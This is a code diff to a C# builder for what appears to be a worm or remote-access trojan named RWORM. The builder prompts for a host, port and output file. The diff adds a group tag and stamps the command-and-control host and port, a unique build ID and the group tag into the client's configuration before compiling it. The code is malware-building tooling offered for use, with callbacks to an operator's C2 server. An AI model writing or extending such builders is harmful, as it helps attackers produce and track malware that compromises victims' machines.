@@ -26,14 +26,19 @@ namespace RWORM.Builder
             var output = Console.ReadLine();
             if (string.IsNullOrEmpty(output)) output = "RWORM.exe";
 
+            Console.Write("Group Tag [default]: ");
+            var groupTag = Console.ReadLine();
+            if (string.IsNullOrEmpty(groupTag)) groupTag = "default";
+
             Console.WriteLine();
             Console.WriteLine("Building client...");
             Console.WriteLine($"  Host: {host}");
             Console.WriteLine($"  Port: {port}");
             Console.WriteLine($"  Output: {output}");
+            Console.WriteLine($"  Group Tag: {groupTag}");
             Console.WriteLine();
 
-            BuildClient(host, port, output);
+            BuildClient(host, port, output, groupTag);
 
             Console.WriteLine();
             Console.WriteLine($"[+] Build complete: {output}");
@@ -49,14 +54,24 @@ namespace RWORM.Builder
             return "dotnet";
         }
 
-        static void BuildClient(string host, int port, string output)
+        static void BuildClient(string host, int port, string output, string groupTag)
         {
             var clientPath = Path.Combine("..", "Client");
             var templatePath = Path.Combine(clientPath, "Core", "Config.cs");
             var configContent = File.ReadAllText(templatePath);
 
-            configContent = configContent.Replace("127.0.0.1", host);
-            configContent = configContent.Replace("3333", port.ToString());
+            // Stamp C2 connection
+            configContent = System.Text.RegularExpressions.Regex.Replace(
+                configContent, @"C2Host\s*=\s*""[^""]*""", $"C2Host = \"{host}\"");
+            configContent = System.Text.RegularExpressions.Regex.Replace(
+                configContent, @"C2Port\s*=\s*\d+", $"C2Port = {port}");
+
+            // Stamp unique Build ID and group tag
+            var buildId = Guid.NewGuid().ToString();
+            configContent = System.Text.RegularExpressions.Regex.Replace(
+                configContent, @"BuildId\s*=\s*""[^""]*""", $"BuildId   = \"{buildId}\"");
+            configContent = System.Text.RegularExpressions.Regex.Replace(
+                configContent, @"GroupTag\s*=\s*""[^""]*""", $"GroupTag  = \"{groupTag}\"");
 
             File.WriteAllText(templatePath, configContent);
             Console.WriteLine("[*] Config updated");
